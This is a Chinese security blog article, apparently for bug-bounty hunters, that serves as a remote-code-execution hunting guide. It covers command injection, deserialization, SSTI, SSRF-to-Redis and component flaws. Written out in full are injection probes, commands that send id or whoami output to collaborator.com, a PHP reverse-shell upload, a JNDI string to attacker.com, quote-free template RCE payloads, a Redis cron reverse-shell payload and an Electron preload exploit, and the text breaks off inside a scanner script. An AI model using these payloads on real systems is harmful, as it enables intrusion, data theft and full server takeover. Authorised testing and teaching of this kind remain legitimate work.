#  通往内核的七条路：RCE获取服务器权限的完整狩猎指南  
原创 逍遥
                    逍遥  逍遥子讲安全   2026-02-27 18:46  
  
**你在测SQL注入时，攻击者已经用一行命令拿下了服务器——RCE不是运气，是方法论。**  
  
2025年底，React2Shell（CVE-2025-55182）漏洞公开后数小时内，全球超过**5.8亿次**  
扫描和利用请求被触发。攻击者通过一个未经认证的HTTP请求，就在目标服务器上执行任意JavaScript代码——无需凭证、无需交互、无需权限。  
  
这就是RCE的恐怖之处：**一次成功的利用，等于直接拿到服务器的“方向盘”**  
。  
  
本文将首次完整公开我的**RCE深度狩猎体系**  
——从命令注入、反序列化、SSTI到竞态条件、组件漏洞，涵盖7大类核心攻击面、12个2025-2026年最新实战案例、全套挖掘方法与武器库，全是干到拧不出水的干货。  
## 第一章 重新认知RCE：为什么它是SRC的“王冠”  
### 1.1 RCE的价值层级  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">层级</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">利用深度</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">典型场景</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">奖金区间</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L1：回显型RCE</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">命令执行结果直接返回</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">命令注入、eval注入</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">3000-8000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L2：盲RCE</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">无回显，需带外交互</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">时间延迟、DNS外带</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">5000-10000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L3：限制环境RCE</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">绕过过滤、沙箱、引号限制</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">无引号SSTI、禁用函数绕过</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">8000-15000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L4：链式RCE</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">多个漏洞组合</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">SSRF+内网RCE、竞态+上传</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">15000-30000元+</span></section></td></tr></tbody></table>  
**核心认知**  
：RCE的价值不在于“能执行命令”，而在于**你能用这个命令走多远**  
。  
## 第二章 第一类：命令注入——最经典的RCE入口  
### 2.1 漏洞原理  
  
当应用程序将用户输入直接拼接到系统命令中，且未进行充分过滤时，攻击者可通过注入特殊字符执行任意命令。  
  
**高危函数/方法**  
：  
- PHP：system()  
、exec()  
、shell_exec()  
、passthru()  
、popen()  
  
- Python：os.system()  
、subprocess.Popen(shell=True)  
  
- Java：Runtime.exec()  
（配合/bin/sh -c  
）  
  
- Node.js：child_process.exec()  
、child_process.spawn(shell=True)  
  
### 2.2 挖掘方法  
  
**白盒测试**  
：搜索上述函数，回溯参数来源。  
  
**黑盒测试**  
：  
```
bash
# 基础探测（Unix）
?param=;id
?param=| id
?param=&& id
?param=|| id
?param=`id`
?param=$(id)
# 基础探测（Windows）
?param=& whoami
?param=| whoami
?param=&& whoami
```  
  
**盲测技巧**  
：  
```
bash
# 时间延迟
?param=;sleep 5
?param=& ping -n 6 127.0.0.1 >NUL
# DNS外带（Linux）
?param=;nslookup $(id).collaborator.com
?param=;curl http://collaborator.com/$(whoami)
# DNS外带（Windows）
?param=& nslookup %USERNAME%.collaborator.com
?param=& powershell -c "iwr http://collaborator.com/$env:USERNAME"
```  
### 2.3 绕过技巧  
  
**无空格注入**  
：  
```
bash
# 使用IFS
?param=${IFS}id
# 使用制表符%09
?param=;id%09
# 使用花括号扩展
?param={cat,/etc/passwd}
```  
  
**引号受限**  
：  
```
bash
# 双引号内逃逸
?param=ls";id;#
# 单引号内逃逸
?param=ls';id;#
```  
  
**关键词过滤**  
：  
```
bash
# 使用通配符
?param=/???/??? /???/passwd
# 使用环境变量拼接
?param=$PATH|cut -c1|tr -d '\n'`# 构造字符
```  
### 2.4 实战案例：竞争条件+RCE获取Shell  
  
**来源**  
：白帽汇安全研究院翻译的真实漏洞悬赏案例  
  
**攻击路径**  
：  
1. **入口发现**  
：进入管理员后台后找到上传功能，upload.php限制.php后缀  
  
1. **突破限制**  
：发现modify.php无后缀检查，可上传任意.php文件  
  
1. **意外发现**  
：上传文件会被转移到S3存储桶，shell无法执行  
  
1. **关键线索**  
：在大量请求响应中，发现个别响应包含**文件本地路径错误信息**  
  
1. **分析结论**  
：文件在上传后、转移到S3前，约有1-2秒存储在本地  
  
1. **攻击构造**  
：用多线程同时发送1000个上传请求 + 持续访问文件路径  
  
1. **成功时刻**  
：经过20-30次请求，在文件被转移前成功触发反弹shell  
  
**关键代码**  
：  
```
http
Content-Disposition: form-data; name="userfile"; filename="reverse.php"
Content-Type: text/php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'"); ?>
```  
  
**启示**  
：使用了S3存储桶的应用往往放松警惕，而文件在本地短暂停留的窗口期正是RCE的机会。  
## 第三章 第二类：不安全反序列化——看不见的代码执行  
### 3.1 漏洞原理  
  
当应用反序列化来自不可信源的数据时，攻击者可以构造恶意对象，在反序列化过程中触发**魔术方法**  
（如__destruct()  
、__wakeup()  
），进而执行任意代码。  
  
**高危生态**  
：  
- Java：ObjectInputStream  
、readObject()  
（配合CommonsCollections等gadget）  
  
- PHP：unserialize()  
（配合__destruct  
、__wakeup  
）  
  
- Python：pickle.loads()  
、yaml.load()  
（不安全的Loader  
）  
  
- .NET：BinaryFormatter  
、JavaScriptSerializer  
（不安全的类型）  
  
### 3.2 挖掘方法  
  
**白盒测试**  
：  
```
bash
# Java
grep -r "ObjectInputStream" .
grep -r "readObject" .
# PHP
grep -r "unserialize(" .
# Python
grep -r "pickle.loads" .
grep -r "yaml.load(" .
```  
  
**黑盒测试**  
：  
- 寻找可能传递序列化数据的参数（如base64编码的字符串、二进制数据）  
  
- 尝试篡改序列化数据，观察应用是否报错  
  
- 错误信息可能包含类名、反序列化异常等线索  
  
### 3.3 实战案例：Log4j2的JNDI注入  
  
**漏洞**  
：CVE-2021-44228（Log4Shell）  
  
**攻击向量**  
：攻击者通过HTTP头、User-Agent等输入点注入JNDI查找语句：  
```
text
${jndi:ldap://attacker.com/exploit}
```  
  
**原理**  
：Log4j2在日志记录时解析 ${}  
 表达式，触发JNDI远程加载恶意类。  
  
**SRC挖掘技巧**  
：  
- 测试所有可能被日志记录的输入点（登录名、Referer、X-Forwarded-For）  
  
- 使用DNS外带验证：${jndi:ldap://${hostName}.collaborator.com/a}  
  
- 若收到回调，则存在漏洞  
  
### 3.4 实战案例：React2Shell（CVE-2025-55182）  
  
**漏洞**  
：React Server Components的RCE漏洞，CVSS 10.0  
  
**原理**  
：RSC Flight协议处理数据时存在不安全的反序列化，攻击者可构造恶意payload，让服务器在特权上下文中执行任意JavaScript代码。  
  
**攻击复杂度**  
：无需认证、无需用户交互、单次HTTP请求即可RCE  
  
**在野利用**  
：漏洞公开后数小时内，多个亚洲背景的APT组织开始扫描利用，高峰期每小时**1272万次**  
命中  
  
**挖掘方法**  
：  
- 识别使用React Server Components的应用  
  
- 发送特制RSC payload测试响应差异  
  
- 使用Nuclei模板批量扫描  
  
**防御绕过**  
：攻击者使用自定义User-Agent（如“React2ShellScanner/1.0.0”）和Assetnote工具进行大规模侦察  
## 第四章 第三类：服务器端模板注入（SSTI）——从模板到Shell  
### 4.1 漏洞原理  
  
当用户输入被直接作为模板内容解析时，攻击者可注入模板表达式，利用模板引擎的功能读取文件、执行命令。  
  
**高危引擎**  
：  
- Python：Jinja2、Mako  
  
- PHP：Twig、Smarty、Blade  
  
- Java：FreeMarker、Velocity  
  
- JavaScript：EJS、Pug、Handlebars（Node.js环境）  
  
- Ruby：ERB  
  
### 4.2 基础检测  
```
python
# 基础探测
{{7*7}}       # 预期返回49
${7*7}        # FreeMarker
<%= 7*7 %>    # ERB
{{7*'7'}}     # Jinja2返回7777777（特征）
```  
  
**指纹识别技巧**  
：  
- Jinja2：{{7*'7'}}  
 → 7777777  
  
- Twig：{{7*7}}  
 → 49  
，{{7*'7'}}  
 → 错误  
  
- FreeMarker：${7*7}  
 → 49  
，${7*'7'}  
 → 错误  
  
### 4.3 无引号绕过技术（2025年最新研究）  
  
来自YesWeHack的研究显示，即使在严格过滤引号的情况下，仍可实现RCE。  
  
**Jinja2无引号RCE**  
：  
  
利用self.__init__.__globals__.__str__()  
提取字符构建字符串：  
```
python
# 生成字符串"id"
1{{self.__init__.__globals__.__str__()[1786:1788]}}
# 完整RCE
1{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```  
  
**Mako无引号RCE**  
：  
```
python
# 生成字符串"id"
${str().join(chr(i)for(i)in[105,100])}
# 完整RCE
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```  
  
**Twig无引号RCE**  
（最难实现）：  
  
利用block特性和_charset  
变量绕过自动转义：  
```
php
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```  
  
**FreeMarker无引号RCE**  
：  
  
利用lower_abc  
函数将数字转换为字母：  
```
java
// 1→a, 2→b, 27→aa...
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```  
### 4.4 实战案例：Coffee Shop CTF的Jinja2绕过  
  
某CTF挑战中，应用使用Jinja2但过滤了所有引号。利用上述__str__()[索引]  
技术，成功构建了无引号RCE payload。  
## 第五章 第四类：SSRF链式RCE——从内网探测到命令执行  
### 5.1 漏洞原理  
  
SSRF允许攻击者让服务器向内网发起请求。如果内网存在RCE漏洞（如未认证的管理接口、存在漏洞的内部服务），SSRF就成为通往RCE的“传送门”。  
### 5.2 挖掘思路  
1. **找到SSRF入口**  
：图片预览、URL抓取、Webhook配置  
  
1. **探测内网**  
：使用dict://  
、http://  
扫描内网IP和端口  
  
1. **寻找内网RCE**  
：扫描到可疑服务后，尝试利用已知漏洞  
  
1. **链式利用**  
：通过SSRF发送攻击payload到内网服务  
  
### 5.3 实战案例：从SSRF到Redis RCE  
  
**攻击路径**  
：  
1. SSRF探测到内网10.0.0.5:6379  
（Redis）  
  
1. 使用gopher://  
协议构造Redis命令：  
  
```
text
gopher://10.0.0.5:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
```  
1. 确认无认证后，构造写定时任务的payload：  
  
```
text
*4
$6
CONFIG
$3
SET
$3
dir
$16
/var/spool/cron/
*4
$6
CONFIG
$3
SET
$10
dbfilename
$4
root
*3
$3
SET
$1
x
$58
* * * * * /bin/bash -i >& /dev/tcp/attacker.com/2333 0>&1
*1
$4
SAVE
```  
1. 两次URL编码后通过SSRF发送，成功反弹Shell  
  
## 第六章 第五类：第三方组件漏洞——供应链的“定时炸弹”  
### 6.1 2025-2026年重大RCE漏洞  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">CVE ID</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">组件</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">攻击向量</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">影响</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">CVE-2025-55182</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">React Server Components</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">不安全反序列化</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">无需认证RCE</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">CVE-2025-11953</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">React Native Community CLI</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">恶意项目配置</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">开发环境RCE</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">CVE-2025-49844</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Redis</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">服务端脚本+内存缺陷</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">云环境Redis RCE</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">runc系列</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">容器运行时</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">恶意容器配置</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">容器逃逸到宿主机</span></section></td></tr></tbody></table>### 6.2 挖掘方法  
  
**版本识别**  
：  
- 通过HTTP头、JS文件、错误信息识别组件版本  
  
- 对比已知漏洞版本范围  
  
**批量扫描**  
：  
```
bash
# 使用Nuclei扫描已知RCE
nuclei -u https://target.com -t cves/ -severity critical
# 使用自定义模板
nuclei -u https://target.com -t custom-rce-templates/
```  
### 6.3 实战案例：Electron桌面应用RCE（Chatwork）  
  
**来源**  
：GMO Flatt Security研究  
  
**漏洞链**  
（三个问题组合）：  
1. **危险的preload方法**  
：shell.openExternal  
暴露给preload上下文，可打开file://  
协议  
  
1. **过时的webviewTag特性**  
：启用了已废弃的webviewTag  
，且未验证<webview>  
选项  
  
1. **路由解析差异**  
：客户端与后端解析URL的方式不同  
  
**攻击流程**  
：  
1. 利用OAuth重定向将用户带到攻击者控制的页面  
  
1. 页面包含恶意<webview>  
标签，preload  
属性指向远程SMB共享的恶意脚本  
  
1. 恶意脚本在preload上下文执行，调用shell.openExternal  
下载并执行恶意可执行文件  
  
1. **结果**  
：用户交互即可RCE，完全控制主机  
  
**关键代码**  
：  
```
html
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```  
```
javascript
// test.js
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
```  
## 第七章 第六类：云原生RCE——容器与K8s的突破  
### 7.1 容器逃逸RCE  
  
当攻击者通过Web漏洞获得容器内权限后，下一步是逃逸到宿主机。  
  
**常见逃逸向量**  
：  
- 危险的挂载：/var/run/docker.sock  
挂载到容器内  
  
- 内核漏洞：CVE-2022-0492（cgroups逃逸）  
  
- 特权容器：--privileged  
模式  
  
- 配置不当：capabilities过多（如CAP_SYS_ADMIN  
）  
  
### 7.2 实战案例：Dangerzone容器逃逸赏金计划  
  
Dangerzone是一个用多层容器隔离文档处理的应用，2025年底启动了逃逸赏金计划。  
  
**攻击目标**  
：突破gVisor和Linux容器隔离，在宿主机上执行代码  
  
**潜在影响**  
：成功逃逸可导致主机完全失陷，影响记者、活动人士等高风险用户  
## 第八章 自动化武器库  
### 8.1 命令注入检测脚本  
```
python
# cmd_injection_scanner.py
import requests
import time
import threading
class CmdInjectionScanner:
    def __init__(self, url, params):
        self.url = url
        self.params = params
        self.collaborator = "your-collaborator.com"

    def test_time_based(self, param, payload):
        """时间盲注检测"""
        data = self.params.copy()
        data[param] = payload

        start = time.time()
        try:
            r = requests.get(self.url, params=data, timeout=10)
            elapsed = time.time() - start
